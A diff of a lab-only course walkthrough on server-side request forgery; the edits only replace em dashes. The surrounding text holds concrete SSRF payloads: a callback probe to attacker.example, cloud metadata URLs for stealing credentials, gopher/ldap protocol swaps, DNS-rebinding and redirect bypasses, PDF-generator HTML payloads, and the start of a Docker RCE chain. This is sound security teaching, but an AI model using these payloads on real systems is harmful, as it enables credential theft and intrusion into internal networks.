@@ -1,4 +1,4 @@
-# Week 08: Attack walkthrough — Server-Side Request Forgery
+# Week 08: Attack walkthrough - Server-Side Request Forgery
 
 > ⚠️ **Lab only.** SSRF probes reach internal infrastructure. Never against systems you don't own.
 
@@ -42,12 +42,12 @@ Every "the server fetches something" feature is a candidate:
 | RSS readers | `?feed_url=...` |
 | Open redirect followers | `?redirect=...` |
 | OAuth / SSO callbacks | `?return_uri=...` |
-| XML External Entity (XXE) — see Week 12 | XML parser fetches a DOCTYPE URL |
+| XML External Entity (XXE) - see Week 12 | XML parser fetches a DOCTYPE URL |
 | Import-from-URL features | "Import data from this Google Sheet" |
 
-Some of these are obvious (a URL field). Others are subtler — a "send invite" feature might fetch the recipient's avatar from Gravatar by email-hash, fetching from a URL the sender doesn't directly specify.
+Some of these are obvious (a URL field). Others are subtler - a "send invite" feature might fetch the recipient's avatar from Gravatar by email-hash, fetching from a URL the sender doesn't directly specify.
 
-## Step 1: Confirm SSRF — point at yourself first
+## Step 1: Confirm SSRF - point at yourself first
 
 ```
 ?avatar_url=http://attacker.example/callback
@@ -69,7 +69,7 @@ If no hit, the server may be filtering (only allowing a few hosts), or it may be
 | Oracle | `http://169.254.169.254/opc/v1/instance/` | Instance principals |
 | DigitalOcean | `http://169.254.169.254/metadata/v1/` | Various |
 
-**AWS IMDSv1 is the catastrophic case.** A `GET` to `169.254.169.254/latest/meta-data/iam/security-credentials/<role>` returns short-lived AWS credentials. With those, the attacker can call any AWS API the EC2 instance's role allows — read S3 buckets, dump RDS, etc.
+**AWS IMDSv1 is the catastrophic case.** A `GET` to `169.254.169.254/latest/meta-data/iam/security-credentials/<role>` returns short-lived AWS credentials. With those, the attacker can call any AWS API the EC2 instance's role allows - read S3 buckets, dump RDS, etc.
 
 The 2019 Capital One breach was exactly this chain. AWS introduced **IMDSv2** in 2019 to require a token (PUT first, then GET with the token header); SSRF can't forge the PUT/GET sequence over a typical HTTP fetcher.
 
@@ -123,7 +123,7 @@ If the URL parser is loose, swap protocol:
 ?avatar_url=ldap://internal-ldap/
 ```
 
-The `gopher://` protocol is particularly powerful — you can craft arbitrary TCP traffic with carefully constructed URLs, used to exploit Redis, memcached, SMTP, etc.
+The `gopher://` protocol is particularly powerful - you can craft arbitrary TCP traffic with carefully constructed URLs, used to exploit Redis, memcached, SMTP, etc.
 
 ## Step 3: Bypass blacklist filters
 
@@ -169,7 +169,7 @@ Second DNS lookup (during fetch):     myhost.attacker.example → 127.0.0.1
 
 You control the DNS server; you return different answers per request. The check and the fetch are different lookups.
 
-Defeats validation-then-fetch designs. The right defense is to **fetch via a custom socket that resolves once and connects to the resolved IP** — never resolve twice.
+Defeats validation-then-fetch designs. The right defense is to **fetch via a custom socket that resolves once and connects to the resolved IP** - never resolve twice.
 
 ### Redirect through your server
 
@@ -197,7 +197,7 @@ Modern parsers (Python `urllib`, Go `net/url`) handle this correctly. Older or c
 
 ## Step 4: Blind SSRF
 
-The response body doesn't return — maybe the fetched data is just used internally. Detect via side channels:
+The response body doesn't return - maybe the fetched data is just used internally. Detect via side channels:
 
 ### Out-of-band (Burp Collaborator)
 
@@ -232,7 +232,7 @@ Trigger a build, check Jenkins build history.
 
 ### PDF / screenshot generators
 
-Apps that turn a URL into a PDF using `wkhtmltopdf`, `puppeteer`, `weasyprint`, `Prince`, etc. — all of them follow `<iframe>`, `<img src>`, and CSS `url()` from the target page.
+Apps that turn a URL into a PDF using `wkhtmltopdf`, `puppeteer`, `weasyprint`, `Prince`, etc. - all of them follow `<iframe>`, `<img src>`, and CSS `url()` from the target page.
 
 ```html
 <!-- Submit this as your profile bio, which the PDF generator renders -->
@@ -257,7 +257,7 @@ A vulnerable parser fetches the metadata URL and includes the response in the pa
 
 If your service consumes URLs from another service (an inbound webhook contains a URL field that you fetch), the upstream service might not validate. You inherit their SSRF surface.
 
-## Step 6: SSRF chain to RCE — the Docker example
+## Step 6: SSRF chain to RCE - the Docker example
 
 ```
 1. SSRF lets you reach localhost:2375 (Docker daemon, no auth in some setups).
